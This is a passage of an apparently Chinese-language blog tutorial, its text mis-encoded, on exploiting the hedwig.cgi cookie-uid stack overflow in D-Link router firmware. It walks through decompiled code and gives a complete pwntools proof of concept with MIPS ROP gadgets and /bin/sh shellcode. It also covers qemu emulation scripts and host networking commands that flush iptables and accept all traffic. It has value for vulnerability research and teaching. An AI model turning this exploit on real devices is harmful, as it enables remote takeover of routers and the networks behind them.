class="line">  fputs(&quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;UTF-8\&quot;?&gt;\n&quot;, stream_1);</span><br><span class="line">  v14 = (const char **)&amp;s_2;</span><br><span class="line">  v15 = 0;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    ++v15;</span><br><span class="line">    fprintf(stream_1, &quot;&lt;%s&gt;\n&quot;, *v14++);</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v15 &lt; i + 1 );</span><br><span class="line">  v16 = strstr(haystack, &quot;&lt;postxml&gt;&quot;);</span><br><span class="line">  fprintf(stream_1, &quot;%s\n&quot;, v16);</span><br><span class="line">  v17 = (const char **)&amp;(&amp;s_2)[i];</span><br><span class="line">  v18 = i + 1;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    --v18;</span><br><span class="line">    fprintf(stream_1, &quot;&lt;/%s&gt;\n&quot;, *v17--);</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v18 &gt; 0 );</span><br><span class="line">  fflush(stream_1);</span><br><span class="line">  xmldbc_read(0, 2, &quot;/var/tmp/temp.xml&quot;);</span><br><span class="line">  fd_2 = fileno(stream_1);</span><br><span class="line">  lockf(fd_2, 0, 0);</span><br><span class="line">  fclose(stream_1);</span><br><span class="line">  remove(&quot;/var/tmp/temp.xml&quot;);</span><br><span class="line">  v20 = (const char *)sobj_get_string(v4);</span><br><span class="line">  sprintf(s, &quot;/htdocs/webinc/fatlady.php\nprefix=%s/%s&quot;, &quot;/runtime/session&quot;, v20);</span><br><span class="line">  xmldbc_ephp(0, 0, s, stdout);</span><br><span class="line">  if ( v9 )</span><br><span class="line">  &#123;</span><br><span class="line">    no_REQUEST = 0;</span><br><span class="line">LABEL_25:</span><br><span class="line">    printf(</span><br><span class="line">      &quot;HTTP/1.1 200 OK\r\nContent-Type: text/xml\r\n\r\n&lt;hedwig&gt;&lt;result&gt;FAILED&lt;/result&gt;&lt;message&gt;%s&lt;/message&gt;&lt;/hedwig&gt;&quot;,</span><br><span class="line">      no_REQUEST);</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_26:</span><br><span class="line">  if ( haystack )</span><br><span class="line">    free(haystack);</span><br><span class="line">  if ( v3 )</span><br><span class="line">    sobj_del(v3);</span><br><span class="line">  if ( v4 )</span><br><span class="line">    sobj_del(v4);</span><br><span class="line">  return v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>getenvå»æ£€æŸ¥ç¯å¢ƒå˜é‡ï¼Œç„¶åå…¨æ£€æµ‹æ˜¯ä¸æ˜¯postä¼ å‚</p>
<p><img src="https://s2.loli.net/2025/06/25/gSOcRiX7GE9Ptwy.png" alt="image" loading="lazy"></p>
<p>cgibin_parse_request,å‡½æ•°ä¸­è·å–ä¸‰ä¸ªç¯å¢ƒå˜é‡ï¼Œè¿™é‡Œå‚æ•°çš„éœ€è¦è®¾ç½®ï¼Œå¹¶ä¸”æœ‰ä¸€å®šçš„è¦æ±‚</p>
<p><img src="https://s2.loli.net/2025/06/25/hxsnNQ3CGOiJa65.png" alt="image" loading="lazy"></p>
<p>æ¼æ´ç‚¹å°±åœ¨sess_get_uidä¸­</p>
<p><img src="https://s2.loli.net/2025/06/25/M46GJC5ljxdwPum.png" alt="image" loading="lazy"></p>
<p>è·å–cookieç¯å¢ƒå˜é‡ï¼Œå¹¶è§£æï¼Œé¦–å…ˆæ˜¯æ£€æŸ¥cookieåæ˜¯å¦æ˜¯uidï¼Œç„¶åå°†uid&#x3D;åçš„ipç»™v4,è€Œä¸”æ²¡æœ‰é™åˆ¶ï¼Œè¿™é‡Œå°±å­˜åœ¨æ ˆæº¢å‡º</p>
<p><img src="https://s2.loli.net/2025/06/25/JklKctPDY9o316X.png" alt="image" loading="lazy"></p>
<p><img src="https://s2.loli.net/2025/06/25/7JuhMRvec3nsLOq.png" alt="image" loading="lazy"></p>
<p>ç„¶åæ˜¯å°†v4-&gt;string-&gt;sï¼Œä½†såªæœ‰0x400å­—èŠ‚ï¼Œç„¶åå°±ä¼šæº¢å‡º</p>
<p><img src="https://s2.loli.net/2025/06/25/9EP8C5nbxw1kN2s.png" alt="image" loading="lazy"></p>
<p><img src="https://s2.loli.net/2025/06/25/mdaJZQGRfqxINB5.png" alt="image" loading="lazy"></p>
<p>ç„¶åå°±æ˜¯åŠ«æŒç¨‹åºæµç¨‹ï¼Œä½†å®é™…ä¸Šè¿˜éœ€è¦ç»•è¿‡ï¼Œä¹Ÿä¸æ˜¯è¯´ç»•è¿‡ï¼Œå‚è€ƒæ­£å¸¸pwnæ ˆæº¢å‡ºçš„æ€è·¯ï¼Œæˆ‘ä»¬è‚¯å®šéœ€è¦è®©ç¨‹åºæ‰§è¡Œå®Œï¼Œç„¶åæ‰èƒ½æ‰§è¡Œåˆ°æˆ‘ä»¬å¸ƒç½®çš„ropé“¾ä¸Šï¼Œå¦‚ä½•è®©ç¨‹åºèƒ½æ­£å¸¸å»æ‰§è¡Œ</p>
<p>åç»­æœ‰ä¸¤ä¸ªè¦æ±‚</p>
<p>1.&#x2F;var&#x2F;tmp&#x2F;temp.xmlå­˜åœ¨</p>
<p>2.haystack !&#x3D; null</p>
<p>ç¬¬ä¸€ä¸ªåªè¦æˆ‘ä»¬ä¸å»ç ´åç¨‹åºç¯å¢ƒå°±ä¸ä¼šå‡ºé—®é¢˜</p>
<p>å…³é”®æ˜¯ç¬¬äºŒä¸ªï¼Œé€šè¿‡äº¤å‰å¼•ç”¨æˆ‘ä»¬å‘ç°æ§åˆ¶haystackå€¼çš„åœ°æ–¹</p>
<p>è¿™é‡Œå®é™…ä¸Šæœ‰ä¸¤ç§å¤„ç†æ–¹å¼ï¼Œå› ä¸ºç›®çš„å°±æ˜¯è®©ç¨‹åºèµ°åˆ°æˆ‘ä»¬çš„gadgetä¸Š</p>
<p><code>1.CONTENT_TYPE=application/x-www-form-urlencoded</code>â€‹</p>
<p>ä¹Ÿæ˜¯ç½‘ä¸Šå¾ˆå¤šå¸ˆå‚…åˆ†æçš„</p>
<p><img src="https://s2.loli.net/2025/06/25/Dw9IW2u7yEFzphx.png" alt="image" loading="lazy"></p>
<p>sub_409a6c</p>
<p>æ¯å½“cgibin_parse_requestè§£æåˆ°ä¸€æ®µéœ€è¦å¤„ç†çš„æ•°æ®æ—¶ï¼Œå°±ä¼šè°ƒç”¨sub_409A6Cï¼ŒæŠŠæ•°æ®äº¤ç»™å®ƒå¤„ç†ã€‚è¿™æ ·ï¼Œhaystackå°±å§‹ç»ˆä¿å­˜ç€æœ€æ–°çš„è¯·æ±‚æ•°æ®å†…å®¹</p>
<p>æ­£å¸¸æ‰§è¡Œçš„è¯haystackæ˜¯ä¸ä¸ºç©ºçš„</p>
<p><img src="https://s2.loli.net/2025/06/25/Fz97VW3J2osjtch.png" alt="image" loading="lazy"></p>
<p>ä¹‹åå°±æ˜¯è·å–ä¸¤ä¸ªç¯å¢ƒå˜é‡ï¼ŒREQUEST_URI&#x2F;CONTENT_LENGTH</p>
<p><img src="https://s2.loli.net/2025/06/25/OR49Ba82KVeoWk1.png" alt="image" loading="lazy"></p>
<p>ä¸»è¦æ˜¯CONTENT_TYPEï¼Œä¼šæ£€æµ‹â€application&#x2F;â€œè¿™ä¸ªå­—ç¬¦ä¸²ï¼ŒåŒæ—¶ä¼šè·³è½¬åˆ°ä¸€ä¸ªåœ°æ–¹ï¼Œidaä¸­æ˜¯çœ‹ä¸åˆ°çš„ï¼Œæˆ‘ä»¬å¯ä»¥ä¸‹æ–­ç‚¹è°ƒè¯•çœ‹çœ‹</p>
<p><img src="https://s2.loli.net/2025/06/25/iTPwgZ4tdMxH6Uq.png" alt="image" loading="lazy"></p>
<p>è¿™é‡Œè¿”å›çš„æ˜¯0x403b10</p>
<p><img src="https://s2.loli.net/2025/06/25/OtCNcwfEqjxevDS.png" alt="image" loading="lazy"></p>
<p>0x403b10</p>
<p><img src="https://s2.loli.net/2025/06/25/OaSB1Aeinbys27d.png" alt="image" loading="lazy"></p>
<p>ç„¶åè¿˜æ˜¯è¿”å›åˆ°0x409a6cï¼Œéœ€è¦ä¿è¯REQUEST_URIå­˜åœ¨ï¼Œç„¶åç¨‹åºå°±å¯ä»¥è¿”å›åˆ°æˆ‘ä»¬å¸ƒç½®å¥½çš„ropä¸Šgetshell</p>
<p><img src="https://s2.loli.net/2025/06/25/6NthXGRgPoWkmq1.png" alt="image" loading="lazy"></p>
<p>â€</p>
<p><img src="https://s2.loli.net/2025/06/25/jXNTEeFgmsRuVq3.png" alt="image" loading="lazy"></p>
<p><img src="https://s2.loli.net/2025/06/25/tQCJhLwnicBfbMV.png" alt="image" loading="lazy"></p>
<p><img src="https://s2.loli.net/2025/06/25/N8qlbJ4EGxBaOjW.png" alt="image" loading="lazy"></p>
<p>å®é™…ä¸Šæˆ‘ä»¬å¯ä»¥<code>CONTENT_TYPE=ä»»æ„</code>â€‹ï¼Œä»…éœ€è®¾ç½®postä¼ å‚å…¶ä»–å‚æ•°éƒ½ä¸ç”¨æ§åˆ¶,è¿™æ ·å²‚ä¸æ˜¯æ›´ç®€å•</p>
<p>åœ¨sub_403B10ä¸è¿›å…¥sub_402FFC,è€Œæ˜¯å¾€ä¸‹èµ°ï¼Œæœ€ååˆ°sub_403794-&gt;cgibin_print_http_status</p>
<p>æ­¤æ—¶ç¨‹åºä¹Ÿå¯ä»¥èµ°å®Œï¼ŒåŒæ—¶ä¸è§¦å‘æŠ¥é”™ï¼Œå¯ä»¥åˆ©ç”¨æ ˆæº¢å‡ºæ¼æ´ï¼Œæ ˆæº¢å‡ºçš„åç§»ä¸ä¸€æ ·ç½¢äº†</p>
<p><img src="https://s2.loli.net/2025/06/25/p15ULvBMFEmdVwJ.png" alt="image" loading="lazy"></p>
<p><img src="https://s2.loli.net/2025/06/25/yPhiwu59nTZzDIq.png" alt="image" loading="lazy"></p>
<p>åç§»</p>
<p><img src="https://s2.loli.net/2025/06/25/bWHFCARkmw8GtMh.png" alt="image" loading="lazy"></p>
<p>poc:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;--&#x27;, &#x27;bash&#x27;, &#x27;-c&#x27;]</span><br><span class="line">context.arch=&#x27;mips&#x27;</span><br><span class="line">context.os=&#x27;linux&#x27;</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">def bug():</span><br><span class="line">    gdb.attach(target=(&quot;127.0.0.1&quot;, 1234), exe=&quot;./htdocs/cgibin&quot;,</span><br><span class="line">               gdbscript=&quot;&quot;&quot;</span><br><span class="line">               b *0x409680\n    </span><br><span class="line">               c\n</span><br><span class="line">               &quot;&quot;&quot;)</span><br><span class="line">    pause()</span><br><span class="line">def s(a):</span><br><span class="line">	p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">	p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">	p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">	p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">	p.recv(a)</span><br><span class="line">def rl(a):</span><br><span class="line">	return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">	p.interactive()</span><br><span class="line"></span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">libc_base = 0x7f738000#local</span><br><span class="line">#libc_base = 0x77f34000 #remote</span><br><span class="line">payload=cyclic(0x1000)</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27;*0x3cd</span><br><span class="line">payload += b&#x27;a&#x27;*(4+0x18+12-2)</span><br><span class="line">payload += p32(libc_base + 0x436D0) # s1  move $t9, $s3 (=&gt; lw... =&gt; jalr $t9)</span><br><span class="line">payload += b&#x27;abcd&#x27;</span><br><span class="line">payload += p32(libc_base + 0x56BD0) # s3  sleep</span><br><span class="line">payload += cyclic(20)#b&#x27;a&#x27;*(4*5)</span><br><span class="line">payload += p32(libc_base + 0x57E50) # ra  li $a0, 1 (=&gt; jalr $s1)</span><br><span class="line"> </span><br><span class="line">payload += b&#x27;a&#x27;*0x18</span><br><span class="line">payload += b&#x27;a&#x27;*(4*4)</span><br><span class="line">payload += p32(libc_base + 0x37E6C) # s4  move  $t9, $a1 (=&gt; jalr $t9)</span><br><span class="line">payload += p32(libc_base + 0x3B974) # ra  addiu $a1, $sp, 0x18 (=&gt; jalr $s4)</span><br><span class="line"> </span><br><span class="line">shellcode = asm(&#x27;&#x27;&#x27;</span><br><span class="line">    slti $a2, $zero, -1</span><br><span class="line">    li $t7, 0x69622f2f</span><br><span class="line">    sw $t7, -12($sp)</span><br><span class="line">    li $t6, 0x68732f6e</span><br><span class="line">    sw $t6, -8($sp)</span><br><span class="line">    sw $zero, -4($sp)</span><br><span class="line">    la $a0, -12($sp)</span><br><span class="line">    slti $a1, $zero, -1</span><br><span class="line">    li $v0, 4011</span><br><span class="line">    syscall 0x40404</span><br><span class="line">&#x27;&#x27;&#x27;)</span><br><span class="line">payload += b&#x27;a&#x27;*0x18</span><br><span class="line">payload += shellcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = b&quot;uid=&quot; + payload</span><br><span class="line">post_content = &quot;Thir0th=Pwner&quot;</span><br><span class="line">p = process(b&quot;&quot;&quot;</span><br><span class="line">    qemu-mipsel -L ./ \</span><br><span class="line">    -0 &quot;hedwig.cgi&quot; \</span><br><span class="line">    -E REQUEST_METHOD=&quot;POST&quot; \</span><br><span class="line">    -E HTTP_COOKIE=\&quot;&quot;&quot;&quot; + payload + b&quot;&quot;&quot;\&quot; \</span><br><span class="line">    -g 1234 ./htdocs/cgibin</span><br><span class="line">&quot;&quot;&quot;, shell = True)</span><br><span class="line"></span><br><span class="line">bug()</span><br><span class="line">p.send(post_content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inter()	</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>â€</p>
<p><img src="https://s2.loli.net/2025/06/25/e8sy2A41lq5aMwK.png" alt="image" loading="lazy"></p>
<p>â€</p>
<h2 id="qemuç”¨æˆ·æ€æ¨¡æ‹Ÿ"><a href="#qemuç”¨æˆ·æ€æ¨¡æ‹Ÿ" class="headerlink" title="qemuç”¨æˆ·æ€æ¨¡æ‹Ÿ"></a>qemuç”¨æˆ·æ€æ¨¡æ‹Ÿ</h2><p>è¿™ä¸ªæ¯”è¾ƒç®€å•ï¼Œå°±è·Ÿæœ¬åœ°è°ƒè¯•å¼‚æ¶æ„ä¸€æ ·ï¼Œä½†å‚æ•°ä¸ä¸€æ ·</p>
<h3 id="ç›´æ¥gdbè°ƒè¯•"><a href="#ç›´æ¥gdbè°ƒè¯•" class="headerlink" title="ç›´æ¥gdbè°ƒè¯•"></a>ç›´æ¥gdbè°ƒè¯•</h3><p>è¿›å…¥ <code>squashfs-root</code>â€‹ æ–‡ä»¶å¤¹ä¸­ï¼Œæ‰§è¡Œä¸‹åˆ—æŒ‡ä»¤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyclic 2000 &gt; payload</span><br></pre></td></tr></table></figure>

<p>init.shè„šæœ¬å¯åŠ¨</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">INPUT=&quot;Thir0th=Pwner&quot;                       # è¦å‘é€çš„ POST æ•°æ®ï¼ˆå¯èƒ½æ˜¯ä¼ªé€ ç™»å½•</span><br><span class="line">æˆ–å‘½ä»¤æ‰§è¡Œå°è¯•ï¼‰</span><br><span class="line">LEN=$(echo -n &quot;$INPUT&quot; | wc -c)         # è‡ªåŠ¨è®¡ç®—æ•°æ®é•¿åº¦ï¼ˆContent-Lengthï¼‰</span><br><span class="line">COOKIE=&quot;uid=`cat payload`&quot;              # ä» payload æ–‡ä»¶è¯»å– cookie uidï¼ˆæ¨¡æ‹Ÿç™»</span><br><span class="line">å½•èº«ä»½ï¼‰</span><br><span class="line"></span><br><span class="line"># ä½¿ç”¨ qemu-mipsel å¯åŠ¨ CGI ç¨‹åºï¼ˆç»‘å®š GDB è°ƒè¯•ç«¯å£ 1234ï¼‰</span><br><span class="line">echo $INPUT | qemu-mipsel -L ./ \</span><br><span class="line">  -0 &quot;hedwig.cgi&quot; \</span><br><span class="line">  -E REQUEST_METHOD=&quot;POST&quot; \</span><br><span class="line">  -E CONTENT_LENGTH=$LEN \</span><br><span class="line">  -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \</span><br><span class="line">  -E HTTP_COOKIE=$COOKIE \</span><br><span class="line">  -E REQUEST_URI=&quot;2333&quot; \</span><br><span class="line">  -g 1234 \</span><br><span class="line">  ./htdocs/cgibin</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>mygdb.sh</p>
<p>gdb-multiarch -x mygdb.sh</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">set architecture mips                                     </span><br><span class="line">set follow-fork-mode child  </span><br><span class="line">set detach-on-fork off                                    </span><br><span class="line">target remote 127.0.0.1:1234</span><br><span class="line">file ./htdocs/cgibin</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>â€</p>
<h3 id="è„šæœ¬è°ƒè¯•"><a href="#è„šæœ¬è°ƒè¯•" class="headerlink" title="è„šæœ¬è°ƒè¯•"></a>è„šæœ¬è°ƒè¯•</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;--&#x27;, &#x27;bash&#x27;, &#x27;-c&#x27;]</span><br><span class="line">context.arch=&#x27;mips&#x27;</span><br><span class="line">context.os=&#x27;linux&#x27;</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">def bug():</span><br><span class="line">    gdb.attach(target=(&quot;127.0.0.1&quot;, 1234), exe=&quot;./htdocs/cgibin&quot;,</span><br><span class="line">               gdbscript=&quot;&quot;&quot;</span><br><span class="line">               b *0x402FFC\n    </span><br><span class="line">               c\n</span><br><span class="line">               &quot;&quot;&quot;)</span><br><span class="line">    pause()</span><br><span class="line">def s(a):</span><br><span class="line">	p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">	p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">	p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">	p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">	p.recv(a)</span><br><span class="line">def rl(a):</span><br><span class="line">	return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">	p.interactive()</span><br><span class="line"></span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = b&quot;uid=&quot; + payload</span><br><span class="line">post_content = &quot;Thir0th=Pwner&quot;</span><br><span class="line">p = process(b&quot;&quot;&quot;</span><br><span class="line">    qemu-mipsel -L ./ \</span><br><span class="line">    -0 &quot;hedwig.cgi&quot; \</span><br><span class="line">    -E REQUEST_METHOD=&quot;POST&quot; \</span><br><span class="line">    -E CONTENT_LENGTH=10 \</span><br><span class="line">    -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \</span><br><span class="line">    -E HTTP_COOKIE=\&quot;&quot;&quot;&quot; + payload + b&quot;&quot;&quot;\&quot; \</span><br><span class="line">    -E REQUEST_URI=&quot;2333&quot; \</span><br><span class="line">    -g 1234 ./htdocs/cgibin</span><br><span class="line">&quot;&quot;&quot;, shell = True)</span><br><span class="line"></span><br><span class="line">bug()</span><br><span class="line">p.send(post_content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inter()	</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>â€</p>
<h2 id="qemuç³»ç»Ÿæ€æ¨¡æ‹Ÿ"><a href="#qemuç³»ç»Ÿæ€æ¨¡æ‹Ÿ" class="headerlink" title="qemuç³»ç»Ÿæ€æ¨¡æ‹Ÿ"></a>qemuç³»ç»Ÿæ€æ¨¡æ‹Ÿ</h2><h3 id="step1-ä¸‹è½½å¯¹åº”å†…æ ¸-é•œåƒ"><a href="#step1-ä¸‹è½½å¯¹åº”å†…æ ¸-é•œåƒ" class="headerlink" title="step1 ä¸‹è½½å¯¹åº”å†…æ ¸+é•œåƒ"></a>step1 ä¸‹è½½å¯¹åº”å†…æ ¸+é•œåƒ</h3><p><a target="_blank" rel="noopener" href="https://people.debian.org/~aurel32/qemu/mipsel/">Index of &#x2F;~aurel32&#x2F;qemu&#x2F;mipsel</a></p>
<p><img src="https://s2.loli.net/2025/06/25/njFp7cTJSz1YeVE.png" alt="image" loading="lazy"></p>
<h3 id="step2-åˆ›å»ºç½‘æ¡¥"><a href="#step2-åˆ›å»ºç½‘æ¡¥" class="headerlink" title="step2 åˆ›å»ºç½‘æ¡¥"></a>step2 åˆ›å»ºç½‘æ¡¥</h3><p>å®‰è£…ç½‘ç»œé…ç½®å™¨</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install bridge-utils uml-utilities</span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹interfacesæ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/network/interfaces</span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹ä¹‹å‰å¯ä»¥å…ˆå¤‡ä»½</p>
<p><code>sudo cp /etc/network/interfaces /etc/network/interfaces.brk</code>â€‹</p>
<p>ä¿®æ”¹ä¸º</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line"> </span><br><span class="line">auto ens33</span><br><span class="line">iface ens33 inet dhcp</span><br><span class="line">up ifconfig ens33 0.0.0.0 up</span><br><span class="line"> </span><br><span class="line">auto br0</span><br><span class="line">iface br0 inet dhcp</span><br><span class="line"> </span><br><span class="line">bridge_ports ens33</span><br><span class="line">bridge_maxwait 0</span><br></pre></td></tr></table></figure>

<p>åœ¨ <code>/etc/qemu-ifup</code>â€‹ æ–‡ä»¶ä¸­å†™å…¥ä¸‹é¢å†…å®¹(å¦‚æœæ²¡æœ‰åˆ™éœ€è¦åˆ›å»ºï¼Œç„¶åä½¿ç”¨ <code>sudo chmod a+x /etc/qemu-ifup</code>â€‹)<br>æ³¨æ„æ˜¯<code>å†™å…¥</code>â€‹ï¼Œ<code>ä¸æ˜¯</code>â€‹æ”¹æˆä¸‹é¢å†…å®¹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">echo &quot;Executing /etc/qemu-ifup&quot;</span><br><span class="line">echo &quot;Bringing up $1 for bridge mode...&quot;</span><br><span class="line">sudo /sbin/ifconfig $1 0.0.0.0 promisc up</span><br><span class="line">echo &quot;Adding $1 to br0...&quot;</span><br><span class="line">sudo /sbin/brctl addif br0 $1</span><br><span class="line">sleep 2</span><br></pre></td></tr></table></figure>

<p>å¼€å¯ç‰©ç†æœºçš„è½¬å‘åŠŸèƒ½</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#! /bin/sh</span><br><span class="line">sudo sysctl -w net.ipv4.ip_forward=1</span><br><span class="line">sudo iptables -F</span><br><span class="line">sudo iptables -X</span><br><span class="line">sudo iptables -t nat -F</span><br><span class="line">sudo iptables -t nat -X</span><br><span class="line">sudo iptables -t mangle -F</span><br><span class="line">sudo iptables -t mangle -X</span><br><span class="line">sudo iptables -P INPUT ACCEPT</span><br><span class="line">sudo iptables -P FORWARD ACCEPT</span><br><span class="line">sudo iptables -P OUTPUT ACCEPT</span><br><span class="line">sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</span><br><span class="line">sudo iptables -I FORWARD 1 -i tap0 -j ACCEPT</span><br><span class="line">sudo iptables -I FORWARD 1 -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br></pre></td></tr></table></figure>

